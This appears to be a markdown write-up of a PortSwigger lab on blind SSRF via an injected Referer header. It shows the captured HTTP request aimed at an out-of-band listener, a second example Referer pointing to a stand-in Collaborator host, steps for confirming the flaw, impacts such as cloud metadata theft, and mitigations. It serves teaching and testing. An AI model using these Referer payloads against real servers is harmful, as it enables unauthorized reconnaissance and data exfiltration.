# 📘 Scenario 3: Blind SSRF via `Referer` Header Injection

## 🔎 Vulnerability Description

In this scenario, the web application processes the `Referer` header on the server-side (e.g., for analytics or logging) without validating or sanitizing it. This creates an opportunity for a **Blind SSRF** attack, where an attacker can supply a malicious domain as the referer and trigger a server-initiated request to an external, attacker-controlled server.

> **Vulnerability Type:** Header Injection, Blind SSRF  
> **OWASP Top 10 ID:** A10:2021 – Server-Side Request Forgery  
> **Risk Level:** Medium to High (depending on data exposure)  

---

## 💡 What is Blind SSRF?

Unlike regular SSRF, **Blind SSRF** does not return visible results to the attacker. Instead, the attacker must monitor a separate out-of-band (OOB) channel such as:

- DNS logs
- HTTP logs on their server
- Burp Collaborator

---

## 🔧 Target

**URL:**


🔗 https://0a4200da04e2f6f5804c8f7b00040056.web-security-academy.net/

---

## 📥 HTTP Request

```http
GET /product?productId=1 HTTP/2
Host: 0a4200da04e2f6f5804c8f7b00040056.web-security-academy.net
Cookie: session=mKM2R2mlh6jw3GAJtgpnanPqbYnkeGnu
Sec-Ch-Ua: "Chromium";v="125", "Not.A/Brand";v="24"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.60 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://sb760ch7a69bhm7gl79lnbdv1m7dv3js.oastify.com/
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Priority: u=0, i

```
---
## 📥 Server Response
```http
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 3585

```
---

## 🧪 Exploitation Steps

Generate a Burp Collaborator URL or set up a DNS/http logging server (e.g., `canarytokens.org`).

Send a request to the target endpoint with the `Referer` header pointing to your OOB listener:
```Referer: https://abcd1234.burpcollaborator.net```
Monitor Burp Collaborator for incoming DNS/HTTP requests from the vulnerable server.

Confirm SSRF behavior even if the browser shows no visible result.

## 💥 Potential Impact

- **Out-of-band data exfiltration**: Sensitive data can be extracted silently.

- **Cloud metadata theft**: If combined with access to URLs like `http://169.254.169.254`.

- **Reconnaissance**: Discover internal network behavior based on DNS queries.

- **Precursor to RCE or lateral movement**.

## ✅ Mitigation Suggestions
- Do not rely on client-supplied headers like `Referer`, `Host`, or `X-Forwarded-For`.

- Validate and sanitize all input headers.

- Use allowlists for outbound traffic destinations.

- Monitor logs for abnormal external requests triggered from internal services.

## 📸 Screenshot

![Exploitation Image Of Scenario 3](https://github.com/hovikhanh/ssrf-demo/images/Picture3.png "Exploitation Image Of Scenario 3")

## 🔗 References

[OWASP Testing Guide – Testing for SSRF](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/19-Testing_for_Server-Side_Request_Forgery)

[Burp Collaborator Guide](https://portswigger.net/burp/documentation/collaborator)

> ⚠️ This scenario simulates Blind SSRF and requires external monitoring. Always test in authorized environments only.